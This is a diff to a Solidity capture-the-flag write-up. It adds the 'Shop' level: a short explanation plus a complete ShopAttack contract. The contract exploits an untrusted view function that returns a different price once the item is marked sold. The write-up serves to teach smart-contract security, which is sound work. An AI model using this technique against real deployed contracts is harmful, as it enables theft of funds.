@@ -23,6 +23,7 @@
 18. [MagicNumber](#18---magicnumber)
 19. [Alien Codex](#19---alien-codex)
 20. [Denial](#20---denial)
+21. [Shop](#21---shop)
     
 ## 01 - Fallback
 
@@ -650,3 +651,35 @@ contract DenialAttack {
 > NOTE2: starting from version ^0.8.0, assert(false) doesn't consume all the remaining gas
 
 [Attack Contract](./contracts/Denial.sol) | [Test script](./test/Denial.test.js)
+
+## 21 - Shop
+
+This level requires us to buy the product for less than the price asked.
+This challenge is similar to [Elevator challenge](#11---elevator), but this time the function `price()` defined in the interface is a `view` function, so it can not maintain a state variable. However, we can still make external calls to functions that are `pure` or `view`.<br>
+
+Therefore, to return two values from the `price()` function, we can return a value based on the `isSold` function:
+```solidity
+function price() external view returns(uint) {
+   return target.isSold() ? 1 : 101;
+}
+```
+The complete Attack contract code:
+```solidity
+contract ShopAttack {
+
+   Shop public target;
+
+   constructor(Shop _target) {
+      target = Shop(_target);
+   }
+
+   function attack() external {
+      target.buy();
+   }
+
+   function price() external view returns(uint) {
+      return target.isSold() ? 1 : 101;
+   }
+}
+```
+[Attack Contract](./contracts/Shop.sol) | [Test script](./test/Shop.test.js)
